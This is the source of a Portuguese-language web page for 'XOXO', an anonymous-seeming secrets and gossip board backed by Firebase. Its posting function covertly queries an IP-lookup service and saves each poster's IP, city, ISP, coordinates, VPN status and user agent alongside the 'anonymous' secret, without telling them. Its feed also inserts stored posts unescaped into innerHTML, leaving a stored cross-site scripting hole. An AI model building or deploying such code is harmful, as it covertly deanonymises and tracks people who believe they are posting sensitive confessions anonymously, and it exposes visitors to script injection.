<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - O Mural dos Segredos</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; }
        .hero { height: 40vh; background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
        .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; }
        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
    </style>
</head>
<body>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o sil√™ncio guarda.</p>
    </header>

    <div id="login-screen">
        <h3>Entre no mural... se tiver coragem.</h3>
        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="O que voc√™ sabe que ningu√©m mais sabe?"></textarea>
            <button class="btn-post" onclick="enviarFofoca()">Soltar o Verbo!</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        // Configura√ß√£o do seu Firebase
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };

        // Inicializa√ß√£o
        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function fakeLogin() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        function enviarFofoca() {
            var inputElement = document.getElementById('fofocaInput');
            var texto = inputElement.value;
            if(texto.trim() === "") return;

            // CAPTURA DE DADOS DE WI-FI E LOCALIZA√á√ÉO (Alterado aqui)
            fetch('https://ipwho.is/')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    var rastro = {
                        ip: data.ip || "Desconhecido",
                        localizacao: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country || "?"),
                        provedor_wifi: data.connection ? data.connection.isp : "Desconhecido",
                        latitude: data.latitude || 0,
                        longitude: data.longitude || 0,
                        tipo_conexao: data.type || "Desconhecido",
                        e_vpn: data.security ? data.security.vpn : false
                    };

                    // Grava√ß√£o no Firestore (Estilo antigo para evitar erros)
                    db.collection("fofocas").add({
                        conteudo: texto,
                        data: firebase.firestore.FieldValue.serverTimestamp(),
                        rastro: rastro,
                        dispositivo: navigator.userAgent
                    })
                    .then(function() {
                        inputElement.value = "";
                        alert("Segredo guardado com sucesso!");
                    })
                    .catch(function(error) {
                        alert("Erro ao enviar! Verifique o console.");
                        console.error(error);
                    });
                })
                .catch(function(err) {
                    // Caso o rastreio falhe, envia apenas o texto para n√£o travar o site
                    db.collection("fofocas").add({
                        conteudo: texto,
                        data: firebase.firestore.FieldValue.serverTimestamp(),
                        rastro: { erro: "Falha ao rastrear" }
                    });
                });
        }

        function carregarFofocas() {
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(function(snapshot) {
                var mural = document.getElementById('mural');
                mural.innerHTML = "";
                snapshot.forEach(function(doc) {
                    var f = doc.data();
                    mural.innerHTML += '<div class="fofoca-card">' +
                        '<small style="color: #444;">üì¢ Um segredo sussurrado...</small>' +
                        '<p style="color: #999;">' + f.conteudo + '</p>' +
                    '</div>';
                });
            });
        }
    </script>
</body>
</html>
